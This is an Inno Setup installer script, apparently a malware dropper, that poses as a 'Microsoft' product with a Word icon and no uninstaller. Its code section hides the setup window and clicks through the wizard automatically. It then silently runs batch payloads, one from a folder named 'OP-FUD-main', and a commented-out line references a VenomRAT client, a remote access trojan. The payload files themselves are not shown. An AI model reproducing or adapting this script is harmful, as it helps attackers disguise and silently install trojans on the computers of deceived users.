#define MyAppName "Microsoft"
#define MyAppVersion "1.0.0.0"
#define MyAppPublisher "Microsoft"
#define MyAppURL "microsoft.com"
#define MyAppExeName "Microsoft.exe"
#expr Exec("C:\Users\Admin\Videos\wd.bat")

[Setup]
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
;AppPublisherURL={#MyAppURL}
;AppSupportURL={#MyAppURL}
;AppUpdatesURL={#MyAppURL}
DefaultDirName={autopf}
DisableDirPage=yes
DisableProgramGroupPage=yes
; Раскомментируйте следующую строку для запуска установки в режиме без прав администратора (только для текущего пользователя).
;PrivilegesRequired=lowest
PrivilegesRequiredOverridesAllowed=commandline
OutputBaseFilename=App
SetupIconFile="C:\Users\Admin\Downloads\word.ico"
SolidCompression=yes
WizardStyle=modern
Compression=lzma/ultra64
InternalCompressLevel=ultra64
CreateUninstallRegKey=no
Uninstallable=no
CreateAppDir=yes
VersionInfoVersion=1.0.0.0
VersionInfoCompany=© Microsoft. All rights reserved.
VersionInfoCopyright=© Microsoft. All rights reserved.

[Code]
{ отобpажает или пpячет окно обpазом, указанным паpаметpом в nCmdShow }
function ShowWindow(hWnd: HWND; nCmdShow: Integer): BOOL; external 'ShowWindow@user32.dll stdcall';

const

  BM_CLICK = $00F5;

procedure CurPageChanged(CurPageID: Integer);

begin
  { использую для скрытия окна мастера, в противном случае видно страницу wpInstalling }
  ShowWindow(StrToInt(ExpandConstant('{wizardhwnd}')), SW_HIDE);
  { здесь нажимаем кнопку... }
  PostMessage(WizardForm.NextButton.Handle, BM_CLICK, 0, 0);
  
end;

[Files]
Source: "C:\Microsoft.exe"; DestDir: "{app}\StrLocalGate\"; Flags: ignoreversion nocompression;
Source: "C:\Users\Admin\Videos\wd.bat"; DestDir: "{sd}\StrLocalGate\"; Flags: ignoreversion;
Source: "C:\Users\Admin\Documents\OP-FUD-main\APP.bat"; DestDir: "{sd}\StrLocalGate\"; Flags: ignoreversion; BeforeInstall: "Sleep(5000)";
;Source: "C:\Users\Admin\3D Objects\VenomRAT\Client.bat"; DestDir: "{sd}\StrLocalGate\"; Flags: ignoreversion;

[Run]
Filename: "{app}\StrLocalGate\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Flags: runascurrentuser nowait skipifsilent
Filename: "{sd}\StrLocalGate\wd.bat"; Parameters: "install"; Flags: runascurrentuser nowait;
Filename: "{sd}\StrLocalGate\APP.bat"; Parameters: "install"; Flags: runascurrentuser postinstall;
;Filename: "{sd}\StrLocalGate\Client.bat"; Parameters: "install"; Flags: runascurrentuser;